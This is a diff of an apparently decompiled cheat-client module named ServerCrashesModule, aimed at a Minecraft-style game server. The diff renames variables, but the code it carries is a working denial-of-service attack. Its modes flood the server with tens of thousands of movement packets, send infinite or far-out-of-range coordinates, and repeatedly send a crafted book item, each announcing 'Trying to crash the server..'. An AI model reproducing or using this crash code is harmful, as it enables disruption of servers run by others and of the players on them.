@@ -16,21 +16,21 @@ public class ServerCrashesModule extends PremiumModule {
    @EventListen
    private void method_8971(class_5596 var1) {
       if (this.method_42015()) {
-         if (mc.method_8520()) {
+         if (client.method_8520()) {
             this.method_41999();
          } else {
             String var4 = this.getStringValueByName("Mode");
             switch (var4) {
                case "Flying Enabled":
-                  double var6 = mc.field_9632.method_37302();
-                  double var8 = mc.field_9632.method_37309();
-                  double var10 = mc.field_9632.method_37156();
+                  double var6 = client.thePlayer.method_37302();
+                  double var8 = client.thePlayer.method_37309();
+                  double var10 = client.thePlayer.method_37156();
                   double var12 = 0.0;
                   double var14 = 0.0;
 
                   for (int var26 = 0; var26 < 50000; var26++) {
                      var14 = (double)(var26 * 7);
-                     mc.method_8614().method_4813(new class_9515(var6 - var14, var8 + var12, var10 + var14, false));
+                     client.method_8614().method_4813(new class_9515(var6 - var14, var8 + var12, var10 + var14, false));
                   }
 
                   class_6324.method_28832("Trying to crash the server..");
@@ -41,14 +41,14 @@ public class ServerCrashesModule extends PremiumModule {
                      this.field_9875 = 0;
 
                      for (int var25 = 0; var25 < 100000; var25++) {
-                        mc.method_8614().method_4813(new class_3195(class_2584.field_12791));
+                        client.method_8614().method_4813(new class_3195(class_2584.field_12791));
                      }
 
                      class_6324.method_28832("Trying to crash the server..");
                   }
                   break;
                case "Book":
-                  class_6098 var16 = new class_6098(class_4897.field_24805);
+                  ItemStack var16 = new ItemStack(class_4897.field_24805);
                   class_3416 var17 = new class_3416();
                   class_5734 var18 = new class_5734();
                   String var19 = "";
@@ -71,7 +71,7 @@ public class ServerCrashesModule extends PremiumModule {
 
                   for (int var28 = 0; var28 < 100; var28++) {
                      try {
-                        mc.method_8614().method_4813(new class_6362(0, var16));
+                        client.method_8614().method_4813(new class_6362(0, var16));
                      } catch (Exception var23) {
                      }
                   }
@@ -79,27 +79,27 @@ public class ServerCrashesModule extends PremiumModule {
                   this.method_41999();
                   break;
                case "Infinity":
-                  mc.method_8614().method_4813(new class_9515(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
+                  client.method_8614().method_4813(new class_9515(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                   class_6324.method_28832("Trying to crash the server..");
                   this.method_41999();
                   break;
                case "BrainFreeze":
-                  mc.method_8614()
+                  client.method_8614()
                      .method_4813(
                         new class_9515(
-                           mc.field_9632.method_37302() + 9999.0,
-                           mc.field_9632.method_37309() + 9999.0,
-                           mc.field_9632.method_37156() + 9999.0,
+                           client.thePlayer.method_37302() + 9999.0,
+                           client.thePlayer.method_37309() + 9999.0,
+                           client.thePlayer.method_37156() + 9999.0,
                            false
                         )
                      );
-                  mc.method_8614()
+                  client.method_8614()
                      .method_4813(
                         new class_9515(
-                           mc.field_9632.method_37302(),
-                           mc.field_9632.method_37241().field_19937,
-                           mc.field_9632.method_37156() + 9999.0,
-                           mc.field_9632.field_41726
+                           client.thePlayer.method_37302(),
+                           client.thePlayer.method_37241().field_19937,
+                           client.thePlayer.method_37156() + 9999.0,
+                           client.thePlayer.field_41726
                         )
                      );
                   if (this.field_9875++ >= 200) {
